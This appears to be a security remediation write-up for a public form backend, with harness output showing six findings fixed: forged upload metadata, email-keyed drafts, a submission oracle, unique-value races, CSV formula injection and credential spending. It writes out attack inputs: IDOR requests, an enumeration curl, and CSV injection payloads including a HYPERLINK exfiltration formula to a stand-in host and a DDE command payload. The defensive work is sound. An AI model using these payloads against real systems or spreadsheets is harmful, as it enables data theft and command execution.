# Public form hardening

Six findings from `PUBLIC_FORM_TAMPERING_REVIEW.md` — 1, 2, 3, 4, 6 and 7 — are
closed here. Each section says what was wrong, what changed, what the change
costs, and what was actually run to prove it rather than asserted.

Every "Verified" block below is output from a harness that drives the real
routers and the real validator. 69 checks; all pass.

---

## The shape of the problem

Five of the six are the same mistake wearing different clothes: **the server
scoped a decision to a value the browser chose for itself.**

| Finding | The thing that was trusted | Who chose it |
|---|---|---|
| 1 | A file's size, type and owner | The request body |
| 2 | Whose draft this is | The query string |
| 3 | Who is allowed to ask about other people's answers | Nobody — the endpoint was open |
| 4 | Whether a value is still free at the moment of writing | A read that happened earlier |
| 7 | Who is allowed to spend the organization's API credentials | Nobody — the endpoint was open |

Finding 6 is the odd one out, and it is not about tampering at all: it is about
what happens to a member of staff who opens the export.

---

## The one new mechanism: a public form session

Findings 2, 3 and 7 all needed the same missing thing — a way to say "this
respondent, this visit" that is not an email address and not nothing at all.

`PublicFormSession` is 48 random bytes the server generates, hands out once, and
thereafter recognises by SHA-256 hash. It is minted by
`POST /api/forms/public/:formId/session`, which is open, because a public form
is public. The point is not to decide who may have a session. The point is that
the handle is issued by the server rather than being whatever the browser felt
like calling itself.

**What it deliberately does not do.** It does not establish identity. The row
has a `verifiedIdentity` column and *nothing writes to it from request input*.
It is reserved for a server-side OTP check that does not exist yet — the current
gate is a hardcoded `1234` verified in the browser (finding 12). Until that
check is built, no path here will tell a caller anything scoped to a person.
That is the correct behaviour for a verification step that has not been written,
rather than pretending the browser's word for it is good enough.

**Why a header and not a cookie.** A cookie is attached by the browser to any
request to our origin, including ones another site caused, which would make
every draft write a CSRF target and require a second token to defend the first.
`X-Form-Session` has to be set deliberately by our own code, and the
cross-origin rules stop another page from setting it.

**Where the gate lives.** In `requirePublicSession()` in the service, not in
Express middleware. These endpoints exist three times over in this codebase —
Express, Cloud Functions and Lambda — and a gate that lives in Express
middleware is a gate that guards one of the three. All three call the same
function.

Two kinds of budget hang off it:

- **Per session** (`uniqueChecks`, `externalChecks`). The increment and the
  limit test are one statement: `updateMany` with the current count in the
  `where` clause updates one row when there was room and zero when there was
  not, so two simultaneous requests cannot both take the last unit.
- **Per form per hour** (`PublicRateCounter`), shared by every replica.
  `express-rate-limit` keeps its counters in one process's memory, so its
  "500 per hour" is really "500 per hour per replica since the last restart".
  That is fine for turning away a flood and useless for "this customer's API
  credentials may be spent 500 times an hour", which has to hold across the
  deployment.

---

## 1 — File uploads are no longer self-reported

### What was wrong

A file field's answer is not the file. The bytes go straight from the browser to
DMS through a pre-signed URL; what arrives in the submission is a short JSON
object *describing* the upload. All four of its values were believed:

```
validation.ts:314   if (field.type === 'file' && field.fileConfig)   ← no config, no checks at all
validation.ts:326   if (typeof f !== 'object' || !f) continue;       ← a string skipped every check
validation.ts:331   f.size, f.mimeType, f.filename                   ← read from the request body
```

and `documentId` appeared nowhere in either `validation.ts` or
`submission.service.ts`, so a submission could reference a document belonging to
another tenant and the reference would be stored and later resolved into a
download URL.

The pre-upload check in `publicInitiateUpload` did not help. It validates the
same client-supplied numbers, before a single byte has been sent: declare 1 KB,
receive a URL, upload 900 MB.

### What changed

`backend/src/lib/fileAnswer.ts` (new) inverts the direction the information
flows. The `documentId` is the only part of the answer worth anything, because
it is the only part the server issued. Everything else is discarded and re-read
from DMS.

- A value that is not an object with a `documentId` is **rejected**, not skipped.
- Each document is fetched from DMS. Its recorded `metadata.formId` must match
  this form and `metadata.fieldId` must match this field.
- Size, MIME type and filename come from the DMS record, and it is those that
  the limits are applied to — and those that get stored.
- The form-level ceiling from `resolveUploadRules` applies even when the field
  has no `fileConfig`, so an unconfigured field is no longer unlimited.
- A document DMS has not finished receiving (no size, or status `pending`) is
  refused.
- If DMS is unreachable or switched off, file answers are **refused**. Losing
  DMS must not mean going back to believing the browser.

"Not found" and "not yours" return the same message on purpose: the difference
is itself an oracle over other tenants' document ids.

`validateSubmission` takes a `ValidationContext` for this. Omitting it refuses
file answers rather than trusting them, so a future caller who forgets fails
loudly instead of silently reverting.

### Verified

```
PASS  1a  900MB .exe declared as a 1KB PDF is rejected
PASS  1b  bare string as a file value is rejected
PASS  1c  no fileConfig: form-level size ceiling still applies
PASS  1d  documentId belonging to another form is rejected
PASS  1e  documentId issued for a different field is rejected
PASS  1f  unknown documentId is rejected
PASS  1g  a real upload is accepted
PASS  1g  stored filename comes from DMS, not the request
PASS  1h  validateSubmission rejects the forged file answer
PASS  1h  validateSubmission accepts the real one
PASS  1h  and rewrites the stored value to DMS truth
PASS  1i  no file context: refuses instead of trusting the browser
PASS  1j  DMS record with no size is unusable
PASS  1j  DMS record still pending upload is unusable
PASS  1j  a complete DMS record reads back
```

### What it costs

One DMS lookup per distinct document per submission, cached within the
submission so a document referenced twice is fetched once. Submissions with file
fields get slower by roughly one round trip.

---

## 2 — A draft is no longer addressable by email

### What was wrong

```
GET    /api/drafts/<formId>?identity=victim@company.com
POST   /api/drafts            {"identity":"victim@company.com", ...}
DELETE /api/drafts/<formId>?identity=victim@company.com
```

No authentication, no rate limit, no secret anywhere in the request. Knowing
somebody's email address was the entire authorisation check for reading,
overwriting or deleting their half-finished application. The form's OTP gate did
not help: it is enforced in the browser, so the drafts API never knew it
existed.

### What changed

Drafts are keyed on `sessionId`. The `identity` column survives as a *label* —
it still travels on a save, because a future verified-OTP resume needs something
to adopt a draft by — but nothing is ever looked up by it, and the unique index
that made it a lookup key is dropped.

Also, while these routes were open:

- A rate limiter (200 per 5 minutes) now sits in front of them.
- Draft contents are filtered to fields the form actually publishes, and to the
  ones currently visible under `showWhen`, with a 1 MB cap. An unauthenticated
  endpoint that accepts arbitrary JSON is free storage.
- Request bodies are no longer logged. A draft body is somebody's partly-filled
  answers, which on these forms includes identity numbers and salary.

### What it costs

**Resuming on a different device stops working.** That is deliberate and it is
not much of a loss: the only thing that made cross-device resume work before was
typing an email address, which is precisely the hole. Restoring it properly
needs an OTP the server actually verifies, at which point `verifiedIdentity` is
where the verified address lands and a draft can be adopted by matching on it.

Drafts written before this migration have no session and are no longer readable.
That is the fix rather than a casualty of it — every one of them was readable by
anyone who could guess an email address. The rows are left in place rather than
deleted, so an operator can inspect or migrate them deliberately.

### Verified

```
PASS  2  GET  ?identity=victim@company.com is refused
PASS  2  POST with a claimed identity is refused
PASS  2  DELETE with a claimed identity is refused
PASS  2  a session can be minted for a published form
PASS  2  the victim can save their own draft
PASS  2  ...and read it back
PASS  2  another session cannot read the victim's draft
PASS  2  ...nor overwrite it by claiming their identity
PASS  2  ...nor delete it
PASS  2  a session for another form is refused
PASS  2  a guessed token is refused
PASS  2  keys that are not fields on this form are dropped
PASS  2  no session is issued for an unpublished form
```

---

## 3 — `check-unique` is no longer an open oracle

### What was wrong

```bash
curl -d '{"formId":"F","fieldId":"email","value":"ceo@rival.com"}' .../check-unique
# {"isUnique": false}   ← that person applied
```

For a recruitment form, a whistleblower form or a medical intake form, "has this
person submitted?" is often the most sensitive fact in the system. `fieldId` was
free text, so it answered for *any* question on the form, not just the ones
whose uniqueness the form advertises. And each call loaded every submission for
the form and compared answers in Node, so one cheap request cost O(total
responses).

### What changed

Four things narrow it, and it is worth being honest that they narrow it rather
than close it: an endpoint whose purpose is to answer this question is an oracle
by construction. The guarantee is the submit-time check; this is a courtesy that
warns someone before they fill in the rest of the page.

1. A server-issued session is required, so every question is attributable.
2. 25 questions per session. Enumeration then costs a fresh session per batch,
   and minting is rate limited to 30 per 15 minutes per address.
3. Only fields the schema marks `unique` can be asked about. Everything else
   answers `isUnique: true` and discloses nothing.
4. One indexed read of a hashed value, instead of a scan.

### Verified

```
PASS  3  the report's exact curl is refused
PASS  3  with a session it still answers for a unique field
PASS  3  a taken value is reported, case- and space-insensitively
PASS  3  a field that is not marked unique discloses nothing
PASS  3  an unknown fieldId discloses nothing
PASS  3  enumeration runs out of budget
```

---

## 4 — Unique fields have a constraint behind them

### What was wrong

```
read all submissions  →  is this email already used?  →  no  →  insert
```

Two requests that interleave between the read and the insert both see "no". The
comparison was also `String(a) === String(b)`, so `Ada@Example.com` and
`ada@example.com ` were two different people.

Twenty lines below, voting does this correctly: `claimVote` relies on a real
`@@unique([formId, identifier])` and deletes the row if the claim loses. The
unique-field path never got the same treatment.

### What changed

`SubmissionUniqueValue(formId, fieldId, valueHash)` with a unique constraint,
claimed after the insert. Same shape as `AuditLog`: the pre-check stays as the
friendly path that turns away the ordinary double-submit with a clear message
and no write; the constraint is the guarantee. The loser's submission is
deleted, which cascades the claims it had already made, so a partly-claimed
submission cannot leave values reserved by a response that no longer exists.

Claims are made one at a time rather than in a batch on purpose: a batch insert
tells you it failed but not *which* value collided, and the respondent needs to
know which field to change.

Two visible behaviour changes:

- **Comparison folds case and whitespace.** For an email address or an employee
  number, `Ada@X.com ` and `ada@x.com` being two different people is not
  uniqueness, it is a formality. This is stricter than before, so a value that
  previously slipped through will now be refused. That is the correction.
- **Values are hashed, with the form and field mixed into the digest.** This
  table is queried by a public endpoint; it should not also be a plaintext index
  of every address the product has ever received, and the same email on two
  forms should not produce the same hash.

Answers that are not scalars (files, likert matrices, tables) cannot be unique
and are skipped rather than hashed into something meaningless.

### Deploying this

The table starts empty, so until it knows about the responses already in the
database, a repeat of an older answer would not be recognised.
`scripts/db-migrate.mjs` runs the backfill immediately after the migration. If
migrations are applied some other way:

```bash
node scripts/backfill-unique-values.mjs     # or: npm run db:backfill-unique
```

It is idempotent. Duplicates that already exist are reported and **left in
place** — deleting somebody's response to tidy up an index is not a decision a
migration gets to make. Once it has run, nothing can add to them.

The canonicalisation and hashing are duplicated between `src/lib/uniqueValue.ts`
and that script and must stay byte-identical; the harness asserts they agree.

### Verified

```
PASS  4  the first submission is accepted
PASS  4  a repeat is refused, naming the field
PASS  4  a repeat in different case is also refused
PASS  4  refused submissions leave no row behind
PASS  4  exactly one claim is held for the value
PASS  4  five simultaneous identical submissions: exactly one survives
PASS  4  ...and exactly one row was kept
PASS  4  a different value is still accepted
PASS  4  case and whitespace fold: "Ada@X.com " == "ada@x.com"
PASS  4  array order does not create a second value
PASS  4  empty answers cannot be claimed
PASS  4  objects cannot be claimed
PASS  4  the same value on two forms hashes differently
PASS  4  the same value on two fields hashes differently
PASS  4  backfill script and application agree on the hash
```

---

## 6 — CSV export cannot carry a formula

### What was wrong

Quoting protects the *file* — a comma inside a value no longer breaks the column
layout. It does nothing for the *reader*. Excel decides whether a cell is a
formula by looking at its first character after unquoting, so
`"=HYPERLINK(...)"` is still live.

A respondent types the payload into a public form. A member of staff exports the
responses and double-clicks the file. One click exfiltrates the other
respondents' answers.

### What changed

`backend/src/lib/csv.ts`: a value starting `=`, `+`, `-`, `@`, tab or carriage
return gets a leading `'`, which spreadsheets treat as "the rest of this cell is
text". Tab and CR are included because a leading whitespace character is
stripped before the first real character is examined, which is enough to hide a
`=` from a naive check.

The quote shows in the formula bar, not in the cell, and the value is unchanged
for anything that parses CSV properly.

### Verified

```
PASS  6  neutralised: "=HYPERLINK(\"https://evil.tld/?x=…
PASS  6  neutralised: "=cmd|' /C calc'!A0"
PASS  6  neutralised: "+1234"
PASS  6  neutralised: "-1+1"
PASS  6  neutralised: "@SUM(A1:A9)"
PASS  6  neutralised: "\t=1+1"
PASS  6  neutralised: "\r=1+1"
PASS  6  ordinary text is untouched
PASS  6  a negative number typed as text is quoted safely
PASS  6  embedded quotes still doubled
PASS  6  full document
```

---

## 7 — `check-external` no longer spends credentials for free

### What was wrong

The endpoint was public, and the config it loads holds the customer's stored
bearer token, basic-auth password or API key. An unauthenticated caller could
make this server call the customer's endpoint, with the customer's credentials,
as often as they liked. `formData` made it worse: `param.type === 'field'` copies
values out of it into the outbound body, so the caller partially chose the
contents of a request sent by us and signed by them.

### What changed

- A session is required, so calls are attributable and boundable.
- 25 per session, and 500 per form per hour shared across replicas. The second
  is the one that matters: sessions are free, so a distributed caller cycling
  through them is exactly the case the per-IP limiter cannot see.
- `formData` is filtered **here**, not in the browser. A key contributes to the
  outbound payload only if the config names it *and* it is a real field on this
  form. The client already sends only the referenced fields; a client-side
  filter is a courtesy, this is the copy that decides.

The session budget is spent before the per-form one, so a call we are going to
refuse anyway is not also charged to the customer. Checking in the other order
would not make the ceiling any stronger — a caller with a fresh session per
request passes the session budget every time regardless — it would only bill the
customer for requests that never left the building.

### Verified

```
PASS  7  the report's exact curl is refused before any outbound call
PASS  7  a referenced field is forwarded
PASS  7  a field the config names but does not reference is dropped
PASS  7  a param pointing at a non-existent field is dropped
PASS  7  keys the caller invented never reach the payload
PASS  7  the customer's credential is still sent to their own endpoint
PASS  7  one session cannot spend without limit
PASS  7  churning through sessions still hits the form's hourly ceiling
```

The last one is exercised at the service layer rather than over HTTP, because
from one machine the per-IP limiter (60 per 15 minutes) turns the caller away
long before the form ceiling — which is why both exist.

---

## Deployment checklist

1. `npm run db:deploy` in `backend/`. This applies
   `20260908120000_public_form_hardening` and then runs the unique-value
   backfill. Watch the backfill output: it names any pre-existing duplicates it
   found, which are left in place.
2. Deploy backend and frontend **together**. The browser has to mint a session
   before it can save a draft or run a live check; an old frontend against the
   new backend gets a 401 on those three calls (the form still submits).
3. If you deploy the Cloud Functions or Lambda variants, deploy the new
   `createFormSession` entry point with them, or the public form on those
   deployments cannot autosave.

## Still open

Findings 5, 8, 9, 11 and 12 are untouched. Two of them are worth restating,
because they are the ones a security tester will find next:

- **11 — step locking is cosmetic.** `lockOnComplete` is stored on the step and
  the backend never reads it again. Fixing it needs the server to record a
  locked step's answers at the moment it is confirmed, then overwrite or reject
  at final submit. The draft store is the natural place; it is that store with
  an immutability flag, not a new subsystem.
- **12 — the OTP gate is a browser-side stub**, hardcoded to `1234`, with no
  routes behind it. Everything above assumes an unverified respondent, so none
  of it depends on the OTP — but until that gate is real, the product cannot
  claim to know who submitted anything, and `verifiedIdentity` stays null by
  design.
